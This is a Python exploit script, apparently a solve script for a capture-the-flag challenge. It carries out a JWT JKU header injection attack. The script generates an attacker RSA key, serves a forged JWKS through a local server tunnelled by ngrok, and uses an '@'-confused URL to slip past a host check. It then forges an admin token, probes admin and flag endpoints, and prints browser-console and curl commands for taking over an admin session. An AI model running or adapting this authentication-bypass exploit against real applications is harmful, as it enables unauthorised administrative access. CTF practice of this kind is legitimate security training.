import jwt
import json
import base64
import requests
import sys
import os
from pathlib import Path
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.backends import default_backend


class JWKSAttack:
    """Handles JWT JKU injection attack workflow"""
    
    PRIVATE_KEY_FILE = "evil.pem"
    JWKS_FILE = "jwks.json"
    JWKS_DIR = "jwks_serve"
    SERVER_PORT = 5000
    
    def __init__(self):
        self.private_key = None
        self.jwks = None
    
    def generate_keys(self):
        """Generate RSA key pair and JWKS"""
        print("[*] Generating RSA key pair...")
        
        # Generate 2048-bit RSA private key
        private_key = rsa.generate_private_key(
            public_exponent=65537,
            key_size=2048,
            backend=default_backend()
        )
        
        # Export private key as PEM
        private_key_pem = private_key.private_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PrivateFormat.TraditionalOpenSSL,
            encryption_algorithm=serialization.NoEncryption()
        )
        
        # Extract public key parameters
        public_key = private_key.public_key()
        public_numbers = public_key.public_numbers()
        
        # Base64url encode RSA modulus and exponent
        def base64url_encode(num):
            num_bytes = num.to_bytes((num.bit_length() + 7) // 8, byteorder='big')
            return base64.urlsafe_b64encode(num_bytes).rstrip(b'=').decode('utf-8')
        
        # Build JWKS structure
        jwks = {
            "keys": [{
                "kty": "RSA",
                "kid": "evil",
                "use": "sig",
                "alg": "RS256",
                "n": base64url_encode(public_numbers.n),
                "e": base64url_encode(public_numbers.e)
            }]
        }
        
        self.private_key = private_key_pem
        self.jwks = jwks
        
        print("[+] RSA keys generated successfully")
        return private_key_pem, jwks
    
    def save_keys(self):
        """Save private key and JWKS to disk"""
        # Save private key
        with open(self.PRIVATE_KEY_FILE, "wb") as f:
            f.write(self.private_key)
        print(f"[+] Private key saved to {self.PRIVATE_KEY_FILE}")
        
        # Create JWKS directory
        Path(self.JWKS_DIR).mkdir(exist_ok=True)
        
        # Save JWKS in two locations (serve directory + current directory)
        jwks_serve_path = Path(self.JWKS_DIR) / self.JWKS_FILE
        with open(jwks_serve_path, "w") as f:
            json.dump(self.jwks, f, indent=2)
        
        with open(self.JWKS_FILE, "w") as f:
            json.dump(self.jwks, f, indent=2)
        
        print(f"[+] JWKS saved to {self.JWKS_FILE} and {jwks_serve_path}")
    
    def serve_jwks(self):
        """Start HTTP server to serve JWKS"""
        print()
        print("=" * 60)
        print(f"[+] Starting JWKS server on http://0.0.0.0:{self.SERVER_PORT}")
        print("=" * 60)
        print()
        print("NEXT STEPS:")
        print("  1. In another terminal, run: ngrok http 5000")
        print("  2. Copy the ngrok HTTPS URL (e.g., https://abc123.ngrok.io)")
        print("  3. Run the pwn command with your ngrok URL")
        print()
        
        os.chdir(self.JWKS_DIR)
        
        from http.server import SimpleHTTPRequestHandler
        from socketserver import TCPServer
        
        class QuietHandler(SimpleHTTPRequestHandler):
            def log_message(self, format, *args):
                # Print with timestamp
                print(f"[{self.log_date_time_string()}] {format % args}")
        
        try:
            with TCPServer(("0.0.0.0", self.SERVER_PORT), QuietHandler) as httpd:
                httpd.serve_forever()
        except KeyboardInterrupt:
            print("\n[!] Server stopped")
            sys.exit(0)
    
    def load_private_key(self):
        """Load private key from disk"""
        if not Path(self.PRIVATE_KEY_FILE).exists():
            print(f"[!] Error: {self.PRIVATE_KEY_FILE} not found")
            print("[!] Run 'python3 solve.py serve' first to generate keys")
            sys.exit(1)
        
        with open(self.PRIVATE_KEY_FILE, "rb") as f:
            self.private_key = f.read()
        
        print(f"[+] Loaded private key from {self.PRIVATE_KEY_FILE}")
    
    def craft_jku_url(self, attacker_base):
        """
        Craft malicious JKU URL using SSRF bypass technique
        
        Uses the format: https://x@localhost:5000@attacker.com/jwks.json
        This tricks URL parsers that only check the domain after the last @
        """
        # Normalize attacker URL
        attacker_base = attacker_base.rstrip("/")
        
        # Determine scheme
        if attacker_base.startswith("https://"):
            scheme = "https"
            host = attacker_base.replace("https://", "")
        elif attacker_base.startswith("http://"):
            scheme = "http"
            host = attacker_base.replace("http://", "")
        else:
            # Assume HTTPS if no scheme provided
            scheme = "https"
            host = attacker_base
        
        # Craft SSRF bypass URL
        # Format: https://x@localhost:5000@attacker.com/jwks.json
        # The app fetches from localhost:5000 (our server)
        # but the domain check sees "attacker.com"
        jku_url = f"{scheme}://x@localhost:{self.SERVER_PORT}@{host}/jwks.json"
        
        return jku_url
    
    def forge_token(self, jku_url):
        """Forge admin JWT with malicious JKU header"""
        payload = {
            "user_id": 1,
            "username": "admin",
            "is_admin": True,
            "jku": jku_url
        }
        
        headers = {
            "kid": "evil"
        }
        
        token = jwt.encode(
            payload,
            self.private_key,
            algorithm="RS256",
            headers=headers
        )
        
        return token
    
    def exploit_target(self, target_url, attacker_url):
        """Execute the full exploit against target"""
        print("=" * 60)
        print("JWT JKU INJECTION ATTACK")
        print("=" * 60)
        print()
        
        # Load keys
        self.load_private_key()
        
        # Normalize target URL
        target_url = target_url.rstrip("/")
        
        # Craft malicious JKU
        jku_url = self.craft_jku_url(attacker_url)
        
        print(f"[*] Target:      {target_url}")
        print(f"[*] Attacker:    {attacker_url}")
        print(f"[*] JKU (SSRF):  {jku_url}")
        print()
        
        # Forge token
        print("[*] Forging admin JWT...")
        token = self.forge_token(jku_url)
        print(f"[+] Token: {token[:80]}...")
        print()
        
        # Test admin access
        headers = {
            "Authorization": f"Bearer {token}",
            "Content-Type": "application/json"
        }
        
        print("[*] Testing admin access...")
        
        # Try /api/admin/settings
        try:
            response = requests.get(f"{target_url}/api/admin/settings", headers=headers, timeout=10)
            
            if response.status_code == 200:
                print(f"[+] SUCCESS! Admin access granted")
                print(f"[+] Settings response: {response.json()}")
            else:
                print(f"[-] Admin access denied: {response.status_code}")
                print(f"[-] Response: {response.text[:200]}")
                print()
                print("TROUBLESHOOTING:")
                print("  - Is the JWKS server running? (python3 solve.py serve)")
                print("  - Is ngrok running? (ngrok http 5000)")
                print("  - Is the ngrok URL correct and accessible?")
                print("  - Check server logs for incoming requests")
                return
        except requests.exceptions.RequestException as e:
            print(f"[-] Request failed: {e}")
            return
        
        print()
        
        # Try to enumerate endpoints
        print("[*] Enumerating admin endpoints...")
        
        endpoints = [
            "/api/admin/files",
            "/api/admin/users",
            "/api/flag",
            "/flag",
            "/flag.txt"
        ]
        
        for endpoint in endpoints:
            try:
                r = requests.get(f"{target_url}{endpoint}", headers=headers, timeout=5)
                if r.status_code != 404:
                    print(f"  [+] {endpoint} -> {r.status_code}")
                    if r.text:
                        print(f"      {r.text[:300]}")
            except:
                pass
        
        print()
        self.print_usage_info(token, target_url)
    
    def print_usage_info(self, token, target_url):
        """Print token usage instructions"""
        print()
        print("=" * 60)
        print("FORGED ADMIN TOKEN")
        print("=" * 60)
        print(token)
        print()
        
        print("=" * 60)
        print("BROWSER CONSOLE COMMANDS")
        print("=" * 60)
        print("// Paste this into browser console to become admin:")
        print(f'document.cookie = "token={token}; path=/";')
        print(f'localStorage.setItem("token", "{token}");')
        print('localStorage.setItem("is_admin", "true");')
        print('localStorage.setItem("username", "admin");')
        print('window.location = "/admin";')
        print()
        
        print("=" * 60)
        print("CURL COMMANDS")
        print("=" * 60)
        print(f'export TOKEN="{token}"')
        print(f'curl -H "Authorization: Bearer $TOKEN" {target_url}/api/admin/settings')
        print(f'curl -H "Authorization: Bearer $TOKEN" {target_url}/api/admin/files')
        print(f'curl -H "Authorization: Bearer $TOKEN" {target_url}/api/flag')
        print()


def main():
    if len(sys.argv) < 2:
        print(__doc__)
        sys.exit(1)
    
    attack = JWKSAttack()
    command = sys.argv[1].lower()
    
    if command == "serve":
        # Generate keys and start server
        attack.generate_keys()
        attack.save_keys()
        attack.serve_jwks()
    
    elif command == "pwn":
        # Execute exploit
        if len(sys.argv) < 4:
            print("[!] Usage: python3 solve.py pwn <TARGET_URL> <ATTACKER_URL>")
            print()
            print("Example:")
            print("  python3 solve.py pwn http://challenges.1pc.tf:12345 https://abc123.ngrok.io")
            sys.exit(1)
        
        target_url = sys.argv[2]
        attacker_url = sys.argv[3]
        
        attack.exploit_target(target_url, attacker_url)
    
    else:
        print(f"[!] Unknown command: {command}")
        print(__doc__)
        sys.exit(1)


if __name__ == "__main__":
    main()
